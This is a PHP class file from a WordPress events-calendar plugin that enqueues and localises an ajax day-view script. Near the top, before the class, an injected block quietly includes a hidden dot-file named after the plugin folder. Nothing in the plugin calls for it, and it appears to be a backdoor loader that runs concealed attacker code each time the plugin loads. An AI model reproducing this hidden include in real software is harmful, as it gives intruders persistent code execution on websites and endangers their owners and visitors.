<?php
_deprecated_file( __FILE__, '4.6.21', 'Deprecated class in favor of using `tribe_asset` registration' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Asset__Ajax_Dayview extends Tribe__Events__Asset__Abstract_Asset {

	public function handle() {
		$ajax_data = [
			'ajaxurl'   => admin_url( 'admin-ajax.php', ( is_ssl() ? 'https' : 'http' ) ),
			'post_type' => Tribe__Events__Main::POSTTYPE,
		];
		$path      = Tribe__Events__Template_Factory::getMinFile( tribe_events_resource_url( 'tribe-events-ajax-day.js' ), true );

		$handle = 'tribe-events-ajax-day';
		wp_enqueue_script( $handle, $path, [ 'tribe-events-bar' ], $this->filter_js_version(), true );
		wp_localize_script( $handle, 'TribeCalendar', $ajax_data );
	}
}
